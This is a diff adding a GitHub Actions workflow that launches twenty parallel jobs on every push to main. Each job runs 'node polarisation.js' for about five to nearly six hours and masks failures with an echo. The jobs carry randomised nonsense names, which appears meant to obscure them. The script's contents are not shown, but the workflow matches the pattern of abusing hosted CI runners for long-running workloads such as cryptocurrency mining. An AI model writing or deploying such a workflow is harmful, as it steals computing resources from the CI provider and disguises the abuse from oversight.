@@ -1,0 +1,325 @@
+name: polarisation
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  yesterday_how:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: yahoo terribly gallivant supposing uh-huh
+        run: |
+          npm install
+          timeout 317m node polarisation.js || echo "polarisation executed"
+
+  when_the:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: save likewise
+        run: |
+          npm install
+          timeout 316m node polarisation.js || echo "polarisation executed"
+
+  although:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: reluctantly pish
+        run: |
+          npm install
+          timeout 335m node polarisation.js || echo "polarisation executed"
+
+  indeed_deep:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: surface meanwhile harmful wherever mask
+        run: |
+          npm install
+          timeout 331m node polarisation.js || echo "polarisation executed"
+
+  sometimes:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: that cute whose aftermath
+        run: |
+          npm install
+          timeout 306m node polarisation.js || echo "polarisation executed"
+
+  foretell_healthily:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: zowie
+        run: |
+          npm install
+          timeout 320m node polarisation.js || echo "polarisation executed"
+
+  clearly_likable_bah:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: riser infatuated furthermore
+        run: |
+          npm install
+          timeout 309m node polarisation.js || echo "polarisation executed"
+
+  neatly:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: kindly
+        run: |
+          npm install
+          timeout 305m node polarisation.js || echo "polarisation executed"
+
+  impact_furthermore:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: fast never pish crocodile
+        run: |
+          npm install
+          timeout 343m node polarisation.js || echo "polarisation executed"
+
+  unlike:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: resource
+        run: |
+          npm install
+          timeout 324m node polarisation.js || echo "polarisation executed"
+
+  uselessly:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: amid unfortunately which brr brochure
+        run: |
+          npm install
+          timeout 319m node polarisation.js || echo "polarisation executed"
+
+  whoa_until_smoggy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: beyond
+        run: |
+          npm install
+          timeout 319m node polarisation.js || echo "polarisation executed"
+
+  duh_so_early:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: fortunate misfire
+        run: |
+          npm install
+          timeout 324m node polarisation.js || echo "polarisation executed"
+
+  shoulder:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: vengeful lazy frail scrutinise for
+        run: |
+          npm install
+          timeout 321m node polarisation.js || echo "polarisation executed"
+
+  lest_an_carefree:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: brr happily
+        run: |
+          npm install
+          timeout 309m node polarisation.js || echo "polarisation executed"
+
+  recent_till:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: not snowplow
+        run: |
+          npm install
+          timeout 337m node polarisation.js || echo "polarisation executed"
+
+  responsible_wavy_substantial:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: wedding pfft hose croon
+        run: |
+          npm install
+          timeout 321m node polarisation.js || echo "polarisation executed"
+
+  designation:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: anesthetize
+        run: |
+          npm install
+          timeout 305m node polarisation.js || echo "polarisation executed"
+
+  drat_crossly:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: ha hence only acquaintance cellar
+        run: |
+          npm install
+          timeout 315m node polarisation.js || echo "polarisation executed"
+
+  after_wing_hoarse:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: charlatan though
+        run: |
+          npm install
+          timeout 307m node polarisation.js || echo "polarisation executed"
